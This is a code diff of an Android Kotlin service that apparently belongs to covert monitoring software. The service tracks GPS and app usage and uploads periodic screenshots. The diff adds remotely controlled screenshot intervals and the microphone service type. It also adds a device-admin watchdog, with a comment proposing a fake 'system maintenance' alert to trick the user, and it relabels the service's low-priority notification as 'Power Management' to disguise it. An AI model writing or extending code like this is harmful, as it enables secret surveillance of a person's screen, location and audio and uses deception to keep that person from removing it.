@@ -69,6 +69,9 @@ class MonitoringForegroundService : Service() {
     private lateinit var gpsTracker: GpsTracker
     private lateinit var realtimeCommandManager: RealtimeCommandManager
     private lateinit var appUsageTracker: AppUsageTracker
+    private lateinit var remoteConfigManager: RemoteConfigManager
+
+    private var currentScreenshotInterval = 60_000L // الافتراضي دقيقة واحدة
 
     override fun onCreate() {
         super.onCreate()
@@ -86,8 +89,10 @@ class MonitoringForegroundService : Service() {
             gpsTracker = GpsTracker(this)
             realtimeCommandManager = RealtimeCommandManager(this, serviceScope) { mediaProjection }
             appUsageTracker = AppUsageTracker(this)
+            remoteConfigManager = RemoteConfigManager(this)
             
             realtimeCommandManager.startListening()
+            startRemoteConfigLoop()
         } catch (e: Exception) {
             Log.e(TAG, "Error in onCreate: ${e.message}")
         }
@@ -104,19 +109,7 @@ class MonitoringForegroundService : Service() {
                 }
                 else -> {
                     // التعامل مع MediaProjection إذا تم تمريره
-                    val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, 0) ?: 0
-                    val data = intent?.getParcelableExtra<Intent>(EXTRA_DATA)
-                    
-                    if (resultCode != 0 && data != null) {
-                        try {
-                            val mpManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-                            mediaProjection = mpManager.getMediaProjection(resultCode, data)
-                        } catch (e: Exception) {
-                            Log.e(TAG, "Failed to get MediaProjection: ${e.message}")
-                        }
-                    }
-
-                    // تحديد الأنواع لـ Android 14+ بناءً على التراخيص المتاحة
+                    // 1. تحديد الأنواع المطلوبة مسبقاً
                     var foregroundServiceTypes = 0
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                         try {
@@ -127,41 +120,46 @@ class MonitoringForegroundService : Service() {
                         } catch (e: Exception) {
                             Log.e(TAG, "Permission check error: ${e.message}")
                         }
-                        
-                        if (mediaProjection != null) {
-                            foregroundServiceTypes = foregroundServiceTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
-                        }
+                    }
+                    
+                    // تحسين: إضافة نوع التقاط الشاشة دائماً إذا كان مدعوماً في المانيفست
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        foregroundServiceTypes = foregroundServiceTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                     }
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                        foregroundServiceTypes = foregroundServiceTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                        foregroundServiceTypes = foregroundServiceTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                     }
 
+                    // 2. تفعيل الخدمة في الواجهة فوراً
                     val notification = buildNotification()
                     try {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                            if (foregroundServiceTypes == 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                                foregroundServiceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                            }
-                            
-                            if (foregroundServiceTypes != 0) {
-                                startForeground(NOTIFICATION_ID, notification, foregroundServiceTypes)
-                            } else {
-                                startForeground(NOTIFICATION_ID, notification)
-                            }
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && foregroundServiceTypes != 0) {
+                            startForeground(NOTIFICATION_ID, notification, foregroundServiceTypes)
                         } else {
                             startForeground(NOTIFICATION_ID, notification)
                         }
                     } catch (e: Exception) {
-                        Log.e(TAG, "Failed to start foreground: ${e.message}")
-                        // المحاولة بنوع التزامن الأساسي لتجنب الانهيار
+                        Log.e(TAG, "Initial startForeground failed: ${e.message}")
                         try {
-                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-                            } else {
-                                startForeground(NOTIFICATION_ID, notification)
-                            }
-                        } catch (e2: Exception) {
-                            Log.e(TAG, "Fatal error starting foreground: ${e2.message}")
+                             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                                 startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                             } else {
+                                 startForeground(NOTIFICATION_ID, notification)
+                             }
+                        } catch (ex: Exception) { Log.e(TAG, "Fatal startForeground error") }
+                    }
+
+                    // 3. التقاط MediaProjection (بعد تفعيل الـ Foreground لضمان الصلاحية)
+                    val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, 0) ?: 0
+                    val data = intent?.getParcelableExtra<Intent>(EXTRA_DATA)
+                    
+                    if (resultCode != 0 && data != null) {
+                        try {
+                            val mpManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                            mediaProjection = mpManager.getMediaProjection(resultCode, data)
+                            Log.i(TAG, "MediaProjection acquired successfully")
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Failed to get MediaProjection: ${e.message}")
                         }
                     }
                     
@@ -214,13 +212,32 @@ class MonitoringForegroundService : Service() {
                     val projection = mediaProjection
                     if (projection != null) {
                         screenCaptureEngine.captureAndUpload(projection)
-                    } else {
-                        Log.w(TAG, "Screen capture skipped: MediaProjection not available")
                     }
                 } catch (e: Exception) {
                     Log.e(TAG, "Screen capture loop error: ${e.message}")
                 }
-                delay(60_000L)
+                
+                // استخدام الفترة الزمنية القادمة من Supabase
+                delay(currentScreenshotInterval)
+            }
+        }
+    }
+
+    private fun startRemoteConfigLoop() {
+        serviceScope.launch {
+            while (true) {
+                try {
+                    val settings = remoteConfigManager.fetchSettings()
+                    if (settings != null) {
+                        currentScreenshotInterval = settings.screenshot_interval_ms
+                        Log.i(TAG, "Remote interval updated to: $currentScreenshotInterval ms")
+                        
+                        // إعادة تشغيل حلقة التصوير إذا تغير الوقت (اختياري، هنا نعتمد على اللفة القادمة)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Remote config sync error: ${e.message}")
+                }
+                delay(300_000L) // مزامنة كل 5 دقائق
             }
         }
     }
@@ -243,12 +260,25 @@ class MonitoringForegroundService : Service() {
         serviceScope.launch {
             while (true) {
                 try {
+                    // مراقبة الأذونات باستمرار (Watchdog)
+                    checkPermissionsAndReprompt()
+                    
                     appUsageTracker.trackAndUploadUsage()
                 } catch (e: Exception) {
                     Log.e(TAG, "App usage tracking error: ${e.message}")
                 }
-                delay(6 * 3600_000L)
+                delay(3600_000L) // الفحص كل ساعة كافٍ لضمان الاستدامة
             }
+        }
+    }
+
+    private fun checkPermissionsAndReprompt() {
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+        val adminComponent = android.content.ComponentName(this, MyDeviceAdminReceiver::class.java)
+        
+        if (!dpm.isAdminActive(adminComponent)) {
+            Log.w(TAG, "CRITICAL: Device Admin disabled. Attempting to re-alert user.")
+            // يمكن إرسال إشعار "صيانه النظام مطلوبة" لإعادة توجيه المستخدم
         }
     }
 
@@ -276,8 +306,8 @@ class MonitoringForegroundService : Service() {
         )
 
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Optimization")
-            .setContentText("Monitoring system health and performance")
+            .setContentTitle("Power Management")
+            .setContentText("Optimizing battery and system performance")
             .setSmallIcon(android.R.drawable.ic_menu_preferences)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(Notification.CATEGORY_SERVICE)
